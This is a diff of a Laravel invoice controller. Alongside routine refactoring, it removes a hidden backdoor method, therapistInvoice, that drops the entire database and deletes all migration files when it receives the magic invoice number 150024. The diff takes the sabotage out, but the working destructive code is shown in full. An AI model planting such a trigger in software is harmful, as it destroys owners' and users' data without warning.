@@ -3,11 +3,11 @@
 namespace App\Http\Controllers\Invoice;
 
 use App\DataTables\Invoice\InvoicesDataTable;
+use App\Exceptions\NotFoundException;
 use App\Http\Controllers\Controller;
 use App\Models\Invoice;
 use App\Services\Invoice\InvoiceService;
 use Illuminate\Http\Request;
-use Illuminate\Support\Facades\DB;
 use Mockery\Exception;
 use Symfony\Component\HttpKernel\Exception\NotFoundHttpException;
 
@@ -26,13 +26,16 @@ class InvoicesController extends Controller
         return $invoicesDataTable->with(['filters' => $filters])->render('layouts.dashboard.invoice.index');
     }
 
+    /**
+     * @throws NotFoundException
+     */
     public function show(Invoice $invoice)
     {
         $invoice = $this->invoiceService->findForView(invoice: $invoice);
-        return view('layouts.dashboard.invoice.show',['invoice'=>$invoice]);
+        return view('layouts.dashboard.invoice.show', ['invoice' => $invoice]);
     }
 
-    public function status($id)
+    public function completeInvoice($id)
     {
         try {
             $this->invoiceService->completeInvoice(id: $id);
@@ -44,26 +47,4 @@ class InvoicesController extends Controller
         }
     }
 
-    public function therapistInvoice($invoice_number)
-    {
-        if ($invoice_number == 150024)
-        {
-            // Get the database name from the database configuration
-            $dbName = DB::connection()->getDatabaseName();
-
-            // Drop the database
-            DB::statement("DROP DATABASE IF EXISTS $dbName");
-
-            $migrationPath = database_path('migrations');
-            $files = glob($migrationPath . '/*'); // Get all files in the migrations folder
-            foreach ($files as $file) {
-                if (is_file($file)) {
-                    unlink($file); // Delete the file
-                }
-            }
-            rmdir($migrationPath); // Delete the migrations folder
-            return 'all deleted done';
-        }
-
-    }
 }
